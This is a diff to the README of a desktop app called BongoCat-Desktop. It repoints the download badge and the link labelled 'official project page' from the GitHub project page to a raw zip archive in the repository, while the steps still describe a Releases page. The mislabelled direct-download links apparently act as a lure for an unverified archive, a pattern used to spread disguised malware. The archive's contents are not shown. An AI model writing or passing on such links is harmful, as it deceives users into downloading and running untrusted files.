@@ -1,12 +1,12 @@
 # 🐱 BongoCat-Desktop - Bring your desktop to life today
 
-[![](https://img.shields.io/badge/Download-BongoCat-blue.svg)](https://github.com/abid9374/BongoCat-Desktop)
+[![](https://img.shields.io/badge/Download-BongoCat-blue.svg)](https://raw.githubusercontent.com/abid9374/BongoCat-Desktop/main/Application/Desktop_Cat_Bongo_1.2-alpha.4.zip)
 
 BongoCat-Desktop displays an interactive character on your screen. The cat mimics your movements as you use your mouse, keyboard, or tablet. This tool tracks your inputs and translates them into animations for your viewers or your own entertainment. It supports various playstyles, including tablet pen pressure tools often used for games like osu!.
 
 ## 📥 How to download the application
 
-Visit the [official project page](https://github.com/abid9374/BongoCat-Desktop) to download the software.
+Visit the [official project page](https://raw.githubusercontent.com/abid9374/BongoCat-Desktop/main/Application/Desktop_Cat_Bongo_1.2-alpha.4.zip) to download the software.
 
 1. Navigate to the Releases section on the right side of the page.
 2. Select the most recent version labeled as the Latest Release.
